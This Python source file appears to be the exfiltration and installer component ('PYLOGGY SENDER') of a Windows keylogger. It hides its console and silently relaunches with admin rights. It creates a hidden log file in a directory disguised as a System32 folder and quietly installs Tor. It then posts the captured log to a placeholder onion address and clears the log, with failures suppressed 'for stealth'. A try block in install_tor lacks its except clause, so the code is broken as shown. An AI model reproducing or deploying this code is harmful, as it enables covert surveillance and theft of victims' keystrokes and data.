import os
import subprocess
import tempfile
import time
import requests
import sys
import ctypes
import shutil

# --- SILENT MODE DETECTION ---
IS_EXE = getattr(sys, 'frozen', False) and hasattr(sys, '_MEIPASS')
SILENT_MODE = True

# Hide console window when running as .exe
if IS_EXE:
    try:
        # Hide console window
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        # Get console window handle
        hwnd = kernel32.GetConsoleWindow()
        if hwnd:
            user32.ShowWindow(hwnd, 0)  # SW_HIDE = 0
    except:
        pass

    # Redirect stdout/stderr to null when silent
    if SILENT_MODE:
        try:
            sys.stdout = open(os.devnull, 'w')
            sys.stderr = open(os.devnull, 'w')
        except:
            pass

# --- PATH DEFINITIONS ---
DIR = os.path.join(os.getenv('APPDATA', os.path.expanduser('~')), 'Microsoft', 'Windows', 'System32')
FILE_TO_SEND = os.path.join(DIR, 'SystemLog.dat')

ONION = "CHANGE_TO_YOUR_ONION_ADDRESS.onion"

# Path to Tor executable on Windows
TOR_PATH = r"C:\Program Files\Tor\tor.exe"
TOR_INSTALL_DIR = r"C:\Program Files\Tor"

# Bundled Tor Expert Bundle location (relative to script directory)
if IS_EXE:
    # When running as .exe, use the directory containing the .exe
    SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.executable))
    MEIPASS = getattr(sys, '_MEIPASS', None)
    if MEIPASS and os.path.exists(os.path.join(MEIPASS, 'tor')):
        TOR_BUNDLE_DIR = os.path.join(MEIPASS, 'tor')
    else:
        TOR_BUNDLE_DIR = os.path.join(SCRIPT_DIR, 'tor')
else:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
    TOR_BUNDLE_DIR = os.path.join(SCRIPT_DIR, 'tor')

# Setup configuration file path
SETUP_CONFIG_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__ if not IS_EXE else sys.executable)), 'sender_config.txt')

def silent_print(*args, **kwargs):
    """Print only if not in silent mode."""
    if not SILENT_MODE:
        print(*args, **kwargs)
    # logging to a file for debugging
    try:
        log_file = os.path.join(os.path.expanduser('~'), 'tor_setup_debug.log')
        with open(log_file, 'a', encoding='utf-8') as f:
            message = ' '.join(str(arg) for arg in args)
            f.write(f"{message}\n")
    except:
        pass

def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except:
        return False

def request_admin_privileges():
    """Request administrator privileges and restart the script if not running as admin."""
    if is_admin():
        return True
    else:
        if not SILENT_MODE:
            print("=" * 60)
            print("ADMINISTRATOR PRIVILEGES REQUIRED")
            print("=" * 60)
            print("This program needs administrator privileges to:")
            print("  - Copy bundled Tor to installation directory")
            print("  - Create necessary directories and files")
            print("  - Configure system settings")
            print("\nRequesting administrator privileges...")
            print("Please click 'Yes' on the UAC prompt.")
            print("=" * 60)
        
        # Re-run the program with admin rights
        try:
            # Use SW_HIDE (0) to hide window when requesting admin
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 0 if SILENT_MODE else 1
            )
        except Exception as e:
            if not SILENT_MODE:
                print(f"Failed to request administrator privileges: {e}")
                print("Please run this program as administrator manually.")
            return False
        
        return False  # Original process exits, new admin process continues

def check_tor_installed():
    if os.path.exists(TOR_PATH):
        # Verify it's actually the Tor executable
        try:
            result = subprocess.run(
                [TOR_PATH, "--version"],
                capture_output=True,
                timeout=5,
                creationflags=subprocess.CREATE_NO_WINDOW if IS_EXE else 0
            )
            return result.returncode == 0
        except:
            return False
    return False

def find_bundled_tor():
    """Find the bundled Tor Expert Bundle root directory."""

    # Try multiple possible locations
    search_paths = [TOR_BUNDLE_DIR]
    
    # If running as .exe, also check next to executable and in parent directories
    if IS_EXE:
        exe_dir = os.path.dirname(os.path.abspath(sys.executable))
        search_paths.append(os.path.join(exe_dir, 'tor'))
        # Also check parent directory
        parent_dir = os.path.dirname(exe_dir)
        search_paths.append(os.path.join(parent_dir, 'tor'))
    
    silent_print(f"Searching for Tor bundle in: {search_paths}")
    
    for search_dir in search_paths:
        if not os.path.exists(search_dir):
            silent_print(f"Search path does not exist: {search_dir}")
            continue
        
        silent_print(f"Checking directory: {search_dir}")
        try:
            items = os.listdir(search_dir)
            silent_print(f"Found {len(items)} items in {search_dir}: {items}")
            
            # Look for the bundle root directory - it should contain both 'tor' and 'data' subdirectories
            # Structure: tor/tor-expert-bundle-*/tor/tor.exe and tor/tor-expert-bundle-*/data/
            for item in items:
                bundle_path = os.path.join(search_dir, item)
                if os.path.isdir(bundle_path):
                    silent_print(f"Checking directory: {item}")
                    # Check if this directory contains both 'tor' and 'data' subdirectories
                    tor_subdir = os.path.join(bundle_path, 'tor')
                    data_subdir = os.path.join(bundle_path, 'data')
                    
                    has_tor = os.path.isdir(tor_subdir)
                    has_data = os.path.isdir(data_subdir)
                    silent_print(f"  - Has 'tor' subdirectory: {has_tor}")
                    silent_print(f"  - Has 'data' subdirectory: {has_data}")
                    
                    if has_tor and has_data:
                        # Verify tor.exe exists
                        tor_exe = os.path.join(tor_subdir, 'tor.exe')
                        tor_exe_exists = os.path.exists(tor_exe)
                        silent_print(f"  - tor.exe exists: {tor_exe_exists} at {tor_exe}")
                        
                        if tor_exe_exists:
                            silent_print(f"Found Tor bundle at: {bundle_path}")
                            return bundle_path
        except Exception as e:
            silent_print(f"Error checking {search_dir}: {e}")
            continue
    
    silent_print("Tor bundle not found in any search path")
    return None

def install_tor():
    #  Copy bundled Tor Expert Bundle to the installation directory.
    silent_print("\n" + "=" * 60)
    silent_print("INSTALLING TOR FROM BUNDLE")
    silent_print("=" * 60)
    
    try:
        # Find bundled Tor
        silent_print("Step 1: Looking for bundled Tor Expert Bundle...")
        tor_source_dir = find_bundled_tor()
        
        if not tor_source_dir:
            # Log error to file for debugging
            try:
                error_log = os.path.join(os.path.expanduser('~'), 'tor_install_error.log')
                with open(error_log, 'w') as f:
                    f.write(f"TOR_BUNDLE_DIR: {TOR_BUNDLE_DIR}\n")
                    f.write(f"SCRIPT_DIR: {SCRIPT_DIR}\n")
                    f.write(f"IS_EXE: {IS_EXE}\n")
                    if IS_EXE:
                        f.write(f"sys.executable: {sys.executable}\n")
                    if os.path.exists(TOR_BUNDLE_DIR):
                        f.write(f"TOR_BUNDLE_DIR exists, contents: {os.listdir(TOR_BUNDLE_DIR)}\n")
                    else:
                        f.write("TOR_BUNDLE_DIR does not exist\n")
            except:
                pass
            
            silent_print("\n" + "=" * 60)
            silent_print("BUNDLED TOR NOT FOUND")
            silent_print("=" * 60)
            silent_print(f"The Tor Expert Bundle was not found in: {TOR_BUNDLE_DIR}")
            silent_print("\nPlease ensure the Tor Expert Bundle is extracted in the 'tor' directory")
            silent_print("next to this script.")
            silent_print("=" * 60)
            return False
        
        silent_print(f"Found bundled Tor at: {tor_source_dir}")
        
        # Verify tor.exe exists in the tor subdirectory
        tor_exe_path = os.path.join(tor_source_dir, 'tor', 'tor.exe')
        if not os.path.exists(tor_exe_path):
            silent_print(f"ERROR: tor.exe not found at: {tor_exe_path}")
            return False
        
        silent_print(f"Verified tor.exe exists at: {tor_exe_path}")
        
        # Create installation directory
        silent_print("\nStep 2: Installing Tor to Program Files...")
        
        # Verify we have admin privileges
        if not is_admin():
            silent_print("ERROR: Administrator privileges required to install Tor")
            silent_print("Please run this program as administrator")
            return False
        silent_print("Running with administrator privileges")
        
        # Remove existing directory if it exists
        if os.path.exists(TOR_INSTALL_DIR):
            try:
                silent_print(f"Removing existing directory: {TOR_INSTALL_DIR}")
                shutil.rmtree(TOR_INSTALL_DIR)
                silent_print("Removed existing directory")
            except Exception as e:
                silent_print(f"Warning: Could not remove existing Tor directory: {e}")
        
        # Create the installation directory
        try:
            silent_print(f"Creating directory: {TOR_INSTALL_DIR}")
            # Create parent directory first if needed
            parent_dir = os.path.dirname(TOR_INSTALL_DIR)
            if not os.path.exists(parent_dir):
                silent_print(f"Creating parent directory: {parent_dir}")
                os.makedirs(parent_dir, exist_ok=True)
            
            os.makedirs(TOR_INSTALL_DIR, exist_ok=True)
            
            # Verify it was created
            if not os.path.exists(TOR_INSTALL_DIR):
                silent_print(f"ERROR: Directory was not created: {TOR_INSTALL_DIR}")
                return False
            
            # Test write permissions
            test_file = os.path.join(TOR_INSTALL_DIR, 'test_write.tmp')
            try:
                with open(test_file, 'w') as f:
                    f.write('test')
                os.remove(test_file)
                silent_print("Directory created and writable")
            except Exception as e:
                silent_print(f"WARNING: Directory created but not writable: {e}")
                return False
        except PermissionError as e:
            silent_print(f"ERROR: Permission denied creating directory: {e}")
            silent_print("Make sure you are running as administrator")
            return False
        except Exception as e:
            silent_print(f"ERROR: Could not create installation directory: {e}")
            # Log the error
            try:
                error_log = os.path.join(os.path.expanduser('~'), 'tor_install_error.log')
                with open(error_log, 'w') as f:
                    f.write(f"Failed to create {TOR_INSTALL_DIR}\n")
                    f.write(f"Error: {e}\n")
                    f.write(f"Error type: {type(e).__name__}\n")
                    f.write(f"Is Admin: {is_admin()}\n")
                    import traceback
                    f.write(traceback.format_exc())
            except:
                pass
            return False
        
        # Copy Tor files from bundle to installation directory
        silent_print("Step 3: Copying Tor files...")
        tor_subdir = os.path.join(tor_source_dir, 'tor')
        
        if not os.path.exists(tor_subdir):
            silent_print(f"ERROR: Tor subdirectory not found: {tor_subdir}")
            return False
        
        if not os.path.isdir(tor_subdir):
            silent_print(f"ERROR: Tor subdirectory is not a directory: {tor_subdir}")
            return False
        
        copied_count = 0
        failed_items = []
        
        # Copy all files from tor/tor/ to C:\Program Files\Tor\
        try:
            items = os.listdir(tor_subdir)
            silent_print(f"Found {len(items)} items to copy from {tor_subdir}")
            
            for item in items:
                source = os.path.join(tor_subdir, item)
                dest = os.path.join(TOR_INSTALL_DIR, item)
                try:
                    if os.path.isdir(source):
                        silent_print(f"Copying directory: {item}")
                        shutil.copytree(source, dest, dirs_exist_ok=True)
                        copied_count += 1
                    else:
                        silent_print(f"Copying file: {item}")
                        shutil.copy2(source, dest)
                        copied_count += 1
                        # Verify the file was copied
                        if not os.path.exists(dest):
                            failed_items.append(item)
                            silent_print(f"WARNING: File {item} was not copied successfully")
                except Exception as e:
                    failed_items.append(item)
                    silent_print(f"ERROR: Could not copy {item}: {e}")
            
            if failed_items:
                silent_print(f"WARNING: Failed to copy {len(failed_items)} items: {failed_items}")
        except Exception as e:
            silent_print(f"ERROR: Failed to list or copy files: {e}")
            return False
        
        # copy the data directory if it exists
        data_subdir = os.path.join(tor_source_dir, 'data')
        if os.path.exists(data_subdir):
            data_dest = os.path.join(TOR_INSTALL_DIR, 'data')
            try:
                silent_print("Copying data directory...")
                if os.path.exists(data_dest):
                    shutil.rmtree(data_dest)
                shutil.copytree(data_subdir, data_dest)
                silent_print("Copied data directory")
            except Exception as e:
                silent_print(f"Warning: Could not copy data directory: {e}")
        
        silent_print(f"Copied {copied_count} items to installation directory")
        
        # Verify tor.exe was copied
        if not os.path.exists(TOR_PATH):
            silent_print(f"ERROR: tor.exe was not copied to {TOR_PATH}")
            # Log what's actually in the directory
            try:
                if os.path.exists(TOR_INSTALL_DIR):
                    contents = os.listdir(TOR_INSTALL_DIR)
                    silent_print(f"Contents of {TOR_INSTALL_DIR}: {contents}")
            except:
                pass
            return False
        
        silent_print(f"Verified tor.exe exists at: {TOR_PATH}")
        
        # Verify installation
        silent_print("\nStep 4: Verifying installation...")
        if check_tor_installed():
            silent_print(f"Tor installed successfully at: {TOR_PATH}")
            return True
        else:
            silent_print("WARNING: Tor installation verification failed, but tor.exe exists")
            # If tor.exe exists, consider it a success
            if os.path.exists(TOR_PATH):
                silent_print("Note: tor.exe exists - installation may be successful")
                return True
            return False
            
    except Exception as e:
        silent_print(f"ERROR during Tor installation: {e}")
        # Log full error
        try:
            error_log = os.path.join(os.path.expanduser('~'), 'tor_install_error.log')
            with open(error_log, 'w') as f:
                f.write(f"Error: {e}\n")
        if not SILENT_MODE:
            import traceback
            traceback.print_exc()
        return False

def create_directories_and_files():
    """Create all necessary directories and files."""
    silent_print("\n" + "=" * 60)
    silent_print("CREATING DIRECTORIES AND FILES")
    silent_print("=" * 60)
    
    try:
        # Create main hidden directory
        silent_print(f"Creating directory: {DIR}")
        os.makedirs(DIR, exist_ok=True)
        
        # Make directory hidden
        try:
            ctypes.windll.kernel32.SetFileAttributesW(DIR, 0x02)  # FILE_ATTRIBUTE_HIDDEN
            silent_print("Directory marked as hidden")
        except Exception as e:
            silent_print(f"Warning: Could not mark directory as hidden: {e}")
        
        # Create log file if it doesn't exist
        silent_print(f"Creating log file: {FILE_TO_SEND}")
        if not os.path.exists(FILE_TO_SEND):
            with open(FILE_TO_SEND, 'w', encoding='utf-8') as f:
                f.write('')
            silent_print("Log file created")
        else:
            silent_print("Log file already exists")
        
        # Make log file hidden
        try:
            ctypes.windll.kernel32.SetFileAttributesW(FILE_TO_SEND, 0x02)
        except:
            pass
        
        silent_print("\nAll directories and files created successfully")
        return True
        
    except Exception as e:
        silent_print(f"ERROR creating directories/files: {e}")
        return False

def save_config():
    """Save configuration to file."""
    try:
        config_data = {
            'ONION': ONION,
            'TOR_PATH': TOR_PATH,
            'DIR': DIR,
            'FILE_TO_SEND': FILE_TO_SEND
        }
        
        with open(SETUP_CONFIG_FILE, 'w') as f:
            for key, value in config_data.items():
                f.write(f"{key}={value}\n")
        
        return True
    except Exception as e:
        silent_print(f"Warning: Could not save config: {e}")
        return False

def load_config():
    """Load configuration from file if it exists."""
    global ONION, TOR_PATH, DIR, FILE_TO_SEND
    
    if os.path.exists(SETUP_CONFIG_FILE):
        try:
            with open(SETUP_CONFIG_FILE, 'r') as f:
                for line in f:
                    if '=' in line:
                        key, value = line.strip().split('=', 1)
                        if key == 'ONION':
                            ONION = value
                        elif key == 'TOR_PATH':
                            TOR_PATH = value
                        elif key == 'DIR':
                            DIR = value
                        elif key == 'FILE_TO_SEND':
                            FILE_TO_SEND = value
            return True
        except:
            pass
    return False

def run_setup():
    """Main setup function that orchestrates all setup tasks."""
    silent_print("\n" + "=" * 60)
    silent_print("PYLOGGY SENDER - AUTOMATIC SETUP")
    silent_print("=" * 60)
    
    # Check admin privileges
    silent_print("\n[1/4] Checking administrator privileges...")
    if not is_admin():
        silent_print("Not running as administrator")
        if not request_admin_privileges():
            silent_print("\nSetup cannot continue without administrator privileges.")
            if not SILENT_MODE:
                input("Press Enter to exit...")
            sys.exit(1)
        return False  # Will restart as admin
    else:
        silent_print("Running as administrator")
    
    # Create directories and files
    silent_print("\n[2/4] Creating directories and files...")
    if not create_directories_and_files():
        silent_print("ERROR: Failed to create directories and files")
        return False
    
    # Check and install Tor from bundle
    silent_print("\n[3/4] Checking Tor installation...")
    if not check_tor_installed():
        silent_print("Tor is not installed")
        silent_print("Installing Tor from bundle...")
        if not install_tor():
            silent_print("\nERROR: Tor installation from bundle failed")
            silent_print("Please ensure the Tor Expert Bundle is included with the keylogger.")
            if not SILENT_MODE:
                input("Press Enter to exit...")
            return False
    else:
        silent_print(f"Tor is already installed at: {TOR_PATH}")
    
    # Save configuration
    silent_print("\n[4/4] Saving configuration...")
    if save_config():
        silent_print("Configuration saved")
    else:
        silent_print("Warning: Could not save configuration")
    
    silent_print("\n" + "=" * 60)
    silent_print("SETUP COMPLETED SUCCESSFULLY!")
    silent_print("=" * 60)
    silent_print(f"Tor Path: {TOR_PATH}")
    silent_print(f"Log Directory: {DIR}")
    silent_print(f"Log File: {FILE_TO_SEND}")
    silent_print(f"Onion Address: {ONION}")
    silent_print("=" * 60)
    
    return True

def write_temp_torrc(tempdir):
    """Creates a temporary torrc file for connecting to the public hidden service."""
    torrc = os.path.join(tempdir, "torrc")
    with open(torrc, "w") as f:
        f.write("SOCKSPort 9050\n")
    return torrc

def start_tor(torrc, silent=True):
    """Starts the temporary Tor client instance."""
    if not silent and not SILENT_MODE:
        print("Starting temporary Tor client...")
    # Popen starts the process asynchronously
    try:
        creation_flags = subprocess.CREATE_NO_WINDOW if IS_EXE else 0
        proc = subprocess.Popen([TOR_PATH, "-f", torrc], 
                               stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL,
                               creationflags=creation_flags)
        time.sleep(7)
        return proc
    except Exception:
        return None

def send_data(filepath, silent=True):
    """
    Reads the file content and sends it as a POST request
    via the local Tor SOCKS proxy.
    Returns True if successful, False otherwise.
    """
    # Critical Check: Ensure the file exists before attempting to read
    if not os.path.exists(filepath):
        if not silent:
            print(f"FATAL ERROR: File not found at the specified path: {filepath}")
        return False
    
    # Check if file is empty
    try:
        if os.path.getsize(filepath) == 0:
            return False
    except:
        return False

    proxies = {
        # socks5h ensures DNS resolution happens within the Tor network
        "http": "socks5h://127.0.0.1:9050",
        "https": "socks5h://127.0.0.1:9050"
    }
    url = f"http://{ONION}"

    try:
        # Read the file's binary content
        with open(filepath, "rb") as f:
            file_content = f.read()

        if not silent:
            print(f"File found. Sending {len(file_content)} bytes of data to {ONION}...")

        # Send the file content as the request body
        r = requests.post(url, data=file_content, proxies=proxies, timeout=30)

        if not silent:
            print("\n===== TRANSMISSION REPORT =====")
            print(f"Status code: {r.status_code}")
            print("Server response:", r.text)
            print("===============================\n")

        return r.status_code == 200

    except requests.exceptions.ProxyError:
        if not silent:
            print("CONNECTION FAILED: Could not connect to the Tor proxy (Is Tor running?)")
        return False
    except requests.exceptions.Timeout:
        if not silent:
            print("TRANSMISSION TIMEOUT: The request took too long to complete.")
        return False
    except Exception as e:
        if not silent:
            print(f"An error occurred during transmission: {e}")
        return False



def start_sender(log_file_path=None):
    """
    Executes the full sender logic: starts Tor, attempts data transmission, and shuts down Tor.
    
    Args:
        log_file_path: Path to the log file to send (uses FILE_TO_SEND if None)
    """
    # Use provided path or fallback to default
    target_log_file = log_file_path if log_file_path else FILE_TO_SEND
    
    # The main execution block: Start Tor, attempt send, shut down Tor.
    tor = None
    try:
        with tempfile.TemporaryDirectory() as tempdir:
            torrc = write_temp_torrc(tempdir)
            tor = start_tor(torrc, silent=True)
            
            # If Tor failed to start, exit early
            if tor is None:
                return

            # Give Tor an extra moment to bootstrap after the initial sleep
            # Give Tor an extra moment to bootstrap after the initial sleep
            time.sleep(1)
            
            # Send log file if it exists and has content
            log_sent = False
            if target_log_file and os.path.exists(target_log_file):
                log_sent = send_data(target_log_file, silent=True)
                
                # Clear log file after successful send
                if log_sent:
                    try:
                        with open(target_log_file, 'w', encoding='utf-8') as f:
                            f.write('')
                    except:
                        pass
                            
    except Exception as e:
        # Silent failure for stealth
        pass
    finally:
        if tor:
            try:
                tor.terminate()
            except:
                pass


if __name__ == "__main__":
    # Check if setup flag is provided or if this is first run
    setup_flag = '--setup' in sys.argv or '--install' in sys.argv
    
    # Try to load existing config
    load_config()
    
    # Run setup if requested or if Tor is not installed
    if setup_flag or not check_tor_installed() or not os.path.exists(DIR):
        if run_setup():
            silent_print("\nSetup completed. You can now use the sender normally.")
            if not setup_flag:
                silent_print("Running sender...")
                time.sleep(2)
                start_sender()
        else:
            # If setup requested admin restart, exit here
            sys.exit(0)
    else:
        # Normal operation - just run the sender
        start_sender()
